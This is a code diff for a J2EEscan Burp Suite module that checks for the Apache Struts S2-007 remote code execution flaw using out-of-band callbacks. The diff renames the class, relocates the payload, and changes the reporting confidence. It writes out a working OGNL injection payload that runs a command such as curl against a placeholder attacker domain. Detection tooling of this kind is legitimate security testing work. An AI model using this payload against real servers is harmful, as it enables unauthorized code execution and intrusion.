@@ -14,7 +14,7 @@ import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class ApacheStrutsS2007OOB implements IModule {
+public class StrutsS2007OOB implements IModule {
 
     private static final String TITLE = "Apache Struts S2-007 Remote Code Execution (OOB)";
     private static final String DESCRIPTION = "J2EEscan identified Out Of Band RCE in the webpage"
@@ -32,14 +32,12 @@ public class ApacheStrutsS2007OOB implements IModule {
     //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
     //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
 
-    String payload_template = "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RCE_CMD ATTACKER_DOMAIN').getInputStream())) + '\n";
+
 
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
-
+        String payload_template = "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RCE_CMD ATTACKER_DOMAIN').getInputStream())) + '\n";
         IExtensionHelpers helpers = callbacks.getHelpers();
         List<IScanIssue> issues = new ArrayList<>();
-        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
-        URL curURL = reqInfo.getUrl();
 
         List<String> cmds = new ArrayList<>();
         cmds.add("curl");
@@ -65,14 +63,15 @@ public class ApacheStrutsS2007OOB implements IModule {
             if (!collaboratorInteractions.isEmpty()) {
                 issues.add(new CustomScanIssue(
                         baseRequestResponse.getHttpService(),
-                        reqInfo.getUrl(),
+                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                         checkRequestResponse,
                         TITLE,
                         DESCRIPTION,
                         REMEDY,
                         Risk.High,
-                        Confidence.Certain
+                        Confidence.Firm
                 ));
+                return issues;
             }
         }
 
